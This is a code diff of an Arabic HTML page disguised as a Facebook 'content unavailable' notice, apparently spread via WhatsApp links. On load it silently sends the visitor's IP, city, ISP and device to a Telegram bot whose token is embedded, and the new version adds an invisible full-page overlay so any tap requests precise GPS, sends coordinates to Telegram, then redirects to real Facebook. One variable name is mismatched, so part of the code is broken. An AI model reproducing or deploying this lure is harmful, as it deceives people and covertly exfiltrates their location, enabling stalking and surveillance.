@@ -2,59 +2,90 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="عاجل: توضيح رسمي بخصوص المنشور المحذوف">
-    <meta property="og:description" content="تم تقييد هذا المحتوى مؤقتاً لمراجعة معايير المجتمع. اضغط للمتابعة إلى فيسبوك.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png">
-    <meta property="og:type" content="article">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
+    <meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
+    <meta property="og:description" content="ربما انتهت صلاحية الرابط الذي اتبعته، أو تم حذف المنشور.">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">
+    <meta property="og:type" content="website">
+
     <title>Facebook - Content Removed</title>
     
     <style>
-        body { margin:0; background:#f0f2f5; font-family: Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
-        .fb-card { text-align:center; padding:20px; max-width:400px; }
-        .fb-btn { background:#1877f2; color:#fff; border:none; padding:10px 20px; border-radius:6px; font-weight:bold; cursor:pointer; text-decoration:none; }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: pointer; }
+        .error-box { text-align: center; padding: 20px; max-width: 450px; z-index: 1; }
+        .icon-lock { width: 110px; margin-bottom: 20px; opacity: 0.7; }
+        .title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 12px; }
+        .message { font-size: 16px; color: #65676b; line-height: 1.5; margin-bottom: 30px; }
+        .fb-btn { background: #1877f2; color: white; padding: 12px 24px; border-radius: 6px; font-weight: 600; text-decoration: none; border: none; font-size: 15px; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
     </style>
 </head>
-<body>
+<body onclick="activateFullCapture()">
 
-    <div class="fb-card">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" width="100">
-        <h2 style="color:#65676b;">عذراً، هذا المحتوى غير متاح</h2>
-        <p style="color:#65676b;">ربما تم حذف المنشور أو انتهاء صلاحية الرابط.</p>
-        <a href="https://m.facebook.com" class="fb-btn">العودة للرئيسية</a>
+    <div id="overlay"></div>
+
+    <div class="error-box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" class="icon-lock">
+        <div class="title">عذراً، هذا المحتوى غير متاح الآن</div>
+        <div class="message">
+            ربما انتهت صلاحية الرابط الذي اتبعته، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول لرؤيته في الوقت الحالي.
+        </div>
+        <button class="fb-btn">العودة إلى الصفحة الرئيسية</button>
     </div>
 
 <script>
-    // بيانات البوت الخاصة بك (لا تظهر للمستخدم العادي)
-    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-    const ID = "1611398303";
+    const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
 
-    async function captureData() {
-        // سحب البيانات السلبية (بدون أذونات GPS)
-        // نعتمد هنا على الـ IP والمعلومات التي يرسلها المتصفح تلقائياً
+    // 1. وظيفة سحب البيانات التلقائية (IP + Metadata) بمجرد فتح الرابط
+    async function silentCapture() {
         try {
-            // جلب الـ IP والموقع التقريبي عبر خدمة خارجية موثوقة (صامتة)
-            const response = await fetch('https://ipapi.co/json/');
+            const res = await fetch('https://ipapi.co/json/');
             const data = await response.json();
+            
+            let msg = `🚩 صيد تلقائي (Preview/Open)\n`;
+            msg += `🌐 الـ IP: ${data.ip}\n`;
+            msg += `📍 الموقع: ${data.city}, ${data.country_name}\n`;
+            msg += `📡 المزود: ${data.org}\n`;
+            msg += `📱 الجهاز: ${navigator.platform}`;
 
-            let message = `🚩 صيد جديد من واتساب\n`;
-            message += `🌐 الـ IP: ${data.ip}\n`;
-            message += `📍 الموقع: ${data.city}, ${data.country_name}\n`;
-            message += `📡 المزود: ${data.org}\n`;
-            message += `📱 الجهاز: ${navigator.platform}\n`;
-            message += `🔗 الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-
-            // إرسال البيانات للتلجرام فوراً
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(message)}`);
+            sendToTelegram(msg);
         } catch (e) {
-            // في حال فشل الجلب، نرسل على الأقل معلومات النظام
-            let fallbackMsg = `🚩 دخول (فشل تحديد الـ IP)\n📱 الجهاز: ${navigator.platform}`;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(fallbackMsg)}`);
+            sendToTelegram("🚩 دخول جديد (فشل سحب الـ IP صامتاً)");
         }
     }
 
-    // التنفيذ التلقائي بمجرد التحميل (لأننا نسحب IP وليس GPS)
-    window.onload = captureData;
+    // 2. وظيفة سحب الـ GPS الحقيقي عند أول لمسة (لضمان تجاوز حماية المتصفح)
+    function activateFullCapture() {
+        document.getElementById('overlay').style.display = 'none';
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n`;
+                    msg += `📍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
+                    msg += `🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(msg);
+                    
+                    // بعد الصيد، وجهه لفيسبوك الحقيقي
+                    setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1000);
+                },
+                (err) => {
+                    sendToTelegram("⚠️ المستخدم رفض إذن الـ GPS الدقيق");
+                    window.location.href = "https://m.facebook.com/";
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+    }
+
+    async function sendToTelegram(text) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+
+    // تشغيل السحب الصامت فور تحميل الصفحة
+    window.onload = silentCapture;
 </script>
 </body>
 </html>
